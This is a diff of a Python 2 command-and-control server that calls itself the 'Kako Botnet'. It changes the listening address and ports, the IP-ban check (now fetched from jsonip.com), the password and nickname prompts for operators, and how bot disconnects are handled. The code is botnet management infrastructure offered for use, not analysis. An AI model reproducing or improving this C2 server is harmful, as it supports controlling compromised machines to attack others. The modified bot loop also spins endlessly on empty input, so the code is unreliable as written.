@@ -7,9 +7,9 @@ from json import load
 from urllib2 import urlopen
 from thread import start_new_thread
 
-connect = "" # IP. Usually Empty.
-conport = 8080 # Your Port
-infport = 8000 # Bot Port
+connect = "localhost"
+conport = 8080
+infport = 8888
 
 clients = 0
 bots = 0
@@ -33,10 +33,11 @@ def botDisconnect():
 	global bots
 	bots = bots - 1
 	
-def clientThread(conn, addr):
+def clientThread(conn):
 	createBanned = file("banned.txt", "a")
 	banned = file("banned.txt")
-	if addr[0] in banned:
+	ip = load(urlopen('http://jsonip.com'))['ip']
+	if ip in banned:
 		conn.send("[!] Your IP Address has been banned.\r\n")
 		conn.send("[>] Please contact live:zerefdragneelbro on skype for this to be removed. [<]\r\n")
 		clientDisconnect()
@@ -57,17 +58,14 @@ def clientThread(conn, addr):
 		return conn.recv(512)
 
 	rank = rank(conn)
-	#password = password(conn)
-	#nickname = nickname(conn)
-	password = "Password"
-	nickname = "Law"
-	#if rank.startswith(rankAdmin) and password.startswith(pwordAdmin) or rank.startswith(rankGuest) and password.startswith(pwordGuest):
-	if rank.startswith(rankAdmin) or rank.startswith(rankGuest):
+	password = password(conn)
+	nickname = nickname(conn)
+	if rank.startswith(rankAdmin) and password.startswith(pwordAdmin) or rank.startswith(rankGuest) and password.startswith(pwordGuest):
 		conn.sendall("[>] Welcome to the Kako Botnet [<]\r\n")
 		conn.sendall("[?] Please use the custom client.py made by Law\r\n")
 		conn.sendall("[?] Or else it made not work as its been untested with other clients\r\n")
 		conn.sendall("[?] Type >help for a list of commands [?]\r\n")
-		conn.sendall("[?] Your nickname is: %s\r\n" % nickname)
+		conn.sendall("[?] Your nickname is: %s" % nickname)
 		while True:
 			try:
 				message = conn.recv(512)
@@ -131,7 +129,6 @@ def startClient():
 	host = connect
 	port = conport
 	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 	sock.bind((host, port))
 	sock.listen(999999)
 	time.sleep(0.10)
@@ -143,7 +140,7 @@ def startClient():
 		bc.append(conn)
 		clients = clients + 1
 
-		start_new_thread(clientThread, (conn, addr))
+		start_new_thread(clientThread, (conn,))
 	sock.close()
 
 def bot_thread(conn):
@@ -154,9 +151,7 @@ def bot_thread(conn):
 			print "[-] Bot Disconnected"
 			break
 		if not data:
-			print "[-] Bot Disconnected"
-			conn.close()
-			break
+			pass
 	botDisconnect()
 	conn.close()
 
